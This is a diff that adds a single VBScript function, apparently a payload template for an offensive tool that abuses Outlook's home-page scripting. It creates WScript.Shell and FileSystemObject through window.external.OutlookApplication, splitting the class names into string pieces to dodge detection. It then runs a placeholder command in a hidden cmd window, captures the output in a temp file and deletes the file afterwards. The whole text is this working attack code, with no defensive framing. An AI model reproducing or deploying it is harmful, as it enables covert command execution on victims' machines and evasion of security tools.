@@ -1,0 +1,25 @@
+Function Execute_CMD()
+	On Error Resume Next
+
+	Const HIDDEN_WINDOW = 0
+	Set ws = window.external.OutlookApplication.CreateObject("Wscr" & "ipt.s" & "hell")
+	Set f = window.external.OutlookApplication.CreateObject("Scri" & "pting.FileSyst" & "emObject")
+	tmp = f.GetSpecialFolder(2)
+	fn = f.GetTempName
+	ff = tmp & "\"  & fn
+	c = "cmd /c " & {{command}} & " > " & ff
+
+	ws.Run c, 0, true
+	if f.FileExists(ff) then
+	    set tf = f.OpenTextFile(ff)
+	    if not tf.atendofstream then
+            retval = tf.ReadAll
+            tf.close()
+	        Execute_CMD = "Command executed: " & c & vbCrLf & retval
+        else
+			tf.close()
+			Execute_CMD = "Command: " & c & "  returned no data"
+        end if
+		f.DeleteFile ff
+    end if
+End Function
